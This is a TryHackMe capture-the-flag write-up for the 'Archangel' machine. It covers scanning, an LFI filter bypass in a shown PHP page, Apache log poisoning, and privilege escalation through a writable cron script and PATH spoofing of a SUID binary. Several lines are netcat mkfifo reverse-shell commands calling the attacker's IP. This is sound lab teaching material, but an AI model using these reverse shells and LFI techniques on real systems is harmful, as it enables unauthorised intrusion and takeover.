---
title: "TryHackMe - Archangel"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - LFI to RCE
  - cron
  - path spoofing
---
Boot2root, Web exploitation, Privilege escalation, LFI

## Get a shell
Let's scan the machine first.

```bash
$ rustscan -a 10.10.79.92 --ulimit 10000 -- -A -v -sC -sV                                                                                                            130 ⨯
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.79.92:22
Open 10.10.79.92:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 04:15 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:15
Completed NSE at 04:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:15
Completed NSE at 04:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:15
Completed NSE at 04:15, 0.00s elapsed
Initiating Ping Scan at 04:15
Scanning 10.10.79.92 [2 ports]
Completed Ping Scan at 04:15, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:15
Completed Parallel DNS resolution of 1 host. at 04:15, 13.01s elapsed
DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 04:15
Scanning 10.10.79.92 [2 ports]
Discovered open port 22/tcp on 10.10.79.92
Discovered open port 80/tcp on 10.10.79.92
Completed Connect Scan at 04:15, 0.19s elapsed (2 total ports)
Initiating Service scan at 04:15
Scanning 2 services on 10.10.79.92
Completed Service scan at 04:15, 6.41s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.79.92.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:15
Completed NSE at 04:15, 5.66s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:15
Completed NSE at 04:15, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:15
Completed NSE at 04:15, 0.00s elapsed
Nmap scan report for 10.10.79.92
Host is up, received syn-ack (0.19s latency).
Scanned at 2021-02-04 04:15:02 EST for 27s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got ssh and http ports open. Let's check visit the http service.

<a href="/assets/images/tryhackme/archangel/1.png"><img src="/assets/images/tryhackme/archangel/1.png"></a>

We got a domain `mafialive.thm`, let's change our `hosts` file to resolve the domain.

```
10.10.79.92     mafialive.thm
```

Let's visit the domain we got.

<a href="/assets/images/tryhackme/archangel/2.png"><img src="/assets/images/tryhackme/archangel/2.png"></a>

We got the first flag. Let's enumerate the directories and files using nikto.

```bash
$ nikto -h http://mafialive.thm/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.79.92
+ Target Hostname:    mafialive.thm
+ Target Port:        80
+ Start Time:         2021-02-04 04:49:53 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/test.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ 7786 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2021-02-04 05:16:17 (GMT-5) (1584 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

We got `/test.php`, let's check that.

<a href="/assets/images/tryhackme/archangel/3.png"><img src="/assets/images/tryhackme/archangel/3.png"></a>

When the button clicked:

<a href="/assets/images/tryhackme/archangel/4.png"><img src="/assets/images/tryhackme/archangel/4.png"></a>

Based on the url, this is vulnerable to LFI (Local File Include). Let's test this vulnerability to read the `mrrobot.php` file.

<a href="/assets/images/tryhackme/archangel/5.png"><img src="/assets/images/tryhackme/archangel/5.png"></a>

The source code:

```bash
$ echo "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d                                                                                        130 ⨯
<?php echo 'Control is an illusion'; ?>
```

Let's read the `test.php` file.

<a href="/assets/images/tryhackme/archangel/6.png"><img src="/assets/images/tryhackme/archangel/6.png"></a>

`test.php` source code:

```html
!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>
```

I managed to bypass the `../..` restriction with `/.././`. Let's check the apache2 configuration file first.

<a href="/assets/images/tryhackme/archangel/7.png"><img src="/assets/images/tryhackme/archangel/7.png"></a>

We got the log files path, let's check if it's actually readable.

<a href="/assets/images/tryhackme/archangel/8.png"><img src="/assets/images/tryhackme/archangel/8.png"></a>

Yep! Let's poison the apache2 access log! Reference: [here](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/).

<a href="/assets/images/tryhackme/archangel/9.png"><img src="/assets/images/tryhackme/archangel/9.png"></a>

Let's run our python reverse shell.

<a href="/assets/images/tryhackme/archangel/10.png"><img src="/assets/images/tryhackme/archangel/10.png"></a>

Set up our `netcat` listener and wait for the shell to come back.

```bash
$ nc -lnvp 5555                                                                                                                                                        1 ⨯
listening on [any] 5555 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.78.209] 57854
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

User.txt:

```bash
www-data@ubuntu:/var/www/html/mafialive/flags$ cd /home
cd /homes
www-data@ubuntu:/home$ ls
archangel
www-data@ubuntu:/home$ cd archangel
cd archangel
www-data@ubuntu:/home/archangel$ ls
ls
myfiles  secret  user.txt
www-data@ubuntu:/home/archangel$ cat user.txt
cat user.txt
thm{REDACTED}
```

## Root the machine
Running linpeas.

```bash
$ ./linpeas.sh
...
[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
-rw-r--r-- 1 root root  767 Nov 20 15:00 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Nov 16 22:49 .
drwxr-xr-x 81 root root 4096 Feb  4 17:45 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  607 Jun  3  2013 john
-rw-r--r--  1 root root  712 Jan 18  2018 php
-rw-r--r--  1 root root  190 Nov 16 16:07 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x  2 root root 4096 Nov 16 20:46 .
drwxr-xr-x 81 root root 4096 Feb  4 17:45 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  3  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov 16 15:30 .
drwxr-xr-x 81 root root 4096 Feb  4 17:45 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Nov 16 15:30 .
drwxr-xr-x 81 root root 4096 Feb  4 17:45 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Nov 16 16:07 .
drwxr-xr-x 81 root root 4096 Feb  4 17:45 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   archangel /opt/helloworld.sh
...
```

There is cronjob that running as user `archangel` at `/opt/helloworld.sh`.  Let's check the permissions of the files.

```bash
www-data@ubuntu:/opt$ ls -la
ls -la
total 16
drwxrwxrwx  3 root      root      4096 Nov 20 10:35 .
drwxr-xr-x 22 root      root      4096 Nov 16 15:39 ..
drwxrwx---  2 archangel archangel 4096 Nov 20 15:04 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20 10:35 helloworld.sh
```

We can write the file. Let's inject our reverse shell command so we can get the `archangel` shell back.

```bash
www-data@ubuntu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.25.205 5550 >/tmp/f" >> helloworld.sh
```

Set up `netcat` listener and wait.

```bash
$ nc -lnvp 5550      
listening on [any] 5550 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.78.209] 45534
/bin/sh: 0: can't access tty; job control turned off
$ whoami
archangel
```

User2.txt:

```bash
archangel@ubuntu:~$ ls
myfiles  secret  user.txt
archangel@ubuntu:~$ cd secret
cd secret
archangel@ubuntu:~/secret$ ls
ls
backup  user2.txt
archangel@ubuntu:~/secret$ cat user2.txt
cat user2.txt
thm{REDACTED}
```

Checking files.

```bash
archangel@ubuntu:~/secret$ ls -la
ls -la
total 32
drwxrwx--- 2 archangel archangel  4096 Nov 19 20:41 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20 15:22 ..
-rwsr-xr-x 1 root      root      16904 Nov 18 16:40 backup
-rw-r--r-- 1 root      root         49 Nov 19 20:41 user2.txt
```

We got SUID at `backup` file. Let's disassemble it with IDA.

<a href="/assets/images/tryhackme/archangel/11.png"><img src="/assets/images/tryhackme/archangel/11.png"></a>

Since the `cp` command didn't provide the full path for the binary, we can manipulate / spoof the `cp` with our arbitrary `cp` command.

```bash
archangel@ubuntu:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.25.205 1111 >/tmp/f" > cp
nc 10.11.25.205 1111 >/tmp/f" > cp/tmp/f|/bin/sh -i 2>&1|n"
archangel@ubuntu:/tmp$ chmod +x cp
chmod +x cp
archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
```

Set up our `netcat` listener and run the `backup` file!

```bash
archangel@ubuntu:/tmp$ cd ~/secret
cd ~/secret
archangel@ubuntu:~/secret$ ./backup
./backup
```

We will get the root shell.

```bash
$ nc -lnvp 1111
listening on [any] 1111 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.78.209] 45624
# whoami
root
```

Root.txt:

```bash
# ls
root.txt
# cat root.txt
thm{REDACTED}
````


